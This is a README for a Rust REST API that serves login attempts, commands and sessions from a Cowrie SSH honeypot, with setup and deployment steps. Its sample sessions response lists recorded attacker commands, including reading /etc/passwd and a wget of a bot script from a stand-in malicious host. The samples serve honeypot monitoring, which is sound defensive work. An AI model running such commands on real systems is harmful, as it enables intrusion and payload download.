# cowrie-api

A lightweight REST API written in Rust that parses and serves statistics from a [Cowrie](https://github.com/cowrie/cowrie) SSH honeypot. Built with [Axum](https://github.com/tokio-rs/axum) and designed to be consumed by a portfolio dashboard or any frontend of your choice.

> Part of the **fenrir** honeypot stack! Runs alongside Cowrie in Docker, reading its JSON logs in real time.
 View realtime honeypot data from **fenrir** [here](https://vinhegewald.de/project-fenrir).

---

## Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/health` | Log file status and size |
| `GET` | `/api/stats` | Aggregated overview (top IPs, passwords, commands, recent events) |
| `GET` | `/api/attempts` | Full list of login attempts with success/fail flag |
| `GET` | `/api/commands` | Every command typed by attackers in fake shell sessions |
| `GET` | `/api/sessions` | Activity grouped by session ID |

---

## Running Locally

### With Docker Compose (recommended)

```bash
git clone https://github.com/sirgeon/cowrie-api
cd cowrie-api
docker compose up -d --build
```

The API will be available at `http://localhost:3000`.

### Without Docker

```bash
# Point at a local Cowrie log file
export COWRIE_LOG_PATH=/path/to/cowrie.json
export RUST_LOG=info

cargo run --release
```

---

## Configuration

| Environment Variable | Default | Description |
|---|---|---|
| `COWRIE_LOG_PATH` | `/cowrie/var/log/cowrie/cowrie.json` | Path to Cowrie's JSON log |
| `RUST_LOG` | `info` | Log level (`trace`, `debug`, `info`, `warn`, `error`) |

---

## Example Responses

<details>
<summary><code>GET /api/stats</code></summary>

```json
{
  "total_events": 1532,
  "unique_ips": 87,
  "login_attempts": 1201,
  "successful_logins": 0,
  "commands_run": 45,
  "top_usernames": [
    { "value": "root", "count": 843 },
    { "value": "admin", "count": 201 }
  ],
  "top_passwords": [
    { "value": "123456", "count": 312 }
  ],
  "top_ips": [
    { "value": "192.168.1.10", "count": 120 }
  ],
  "top_commands": [
    { "value": "uname", "count": 18 }
  ],
  "recent_events": [
    {
      "timestamp": "2025-02-19T14:32:01.123456Z",
      "event_type": "cowrie.login.failed",
      "src_ip": "192.168.1.10",
      "detail": "root:123456",
      "session": "a1b2c3d4"
    }
  ]
}
```
</details>

<details>
<summary><code>GET /api/attempts</code></summary>

```json
{
  "total": 1201,
  "attempts": [
    {
      "timestamp": "2025-02-19T14:32:01.123456Z",
      "src_ip": "192.168.1.10",
      "src_port": 54231,
      "username": "root",
      "password": "123456",
      "session": "a1b2c3d4",
      "success": false
    }
  ]
}
```
</details>

<details>
<summary><code>GET /api/sessions</code></summary>

```json
{
  "total": 12,
  "sessions": [
    {
      "session": "a1b2c3d4",
      "src_ip": "192.168.1.10",
      "connected_at": "2025-02-19T14:32:01.123456Z",
      "login_attempts": 3,
      "commands": [
        "uname -a",
        "cat /etc/passwd",
        "wget http://malicious.example.com/bot.sh"
      ]
    }
  ]
}
```
</details>

---

## Deploying to Production

Before exposing the API publicly, put it behind Nginx with TLS:

```nginx
server {
    listen 443 ssl;
    server_name api.yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/api.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.yourdomain.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
    }
}
```

Also update `docker-compose.yml` to bind the API to localhost only:

```yaml
ports:
  - "127.0.0.1:3000:3000"
```
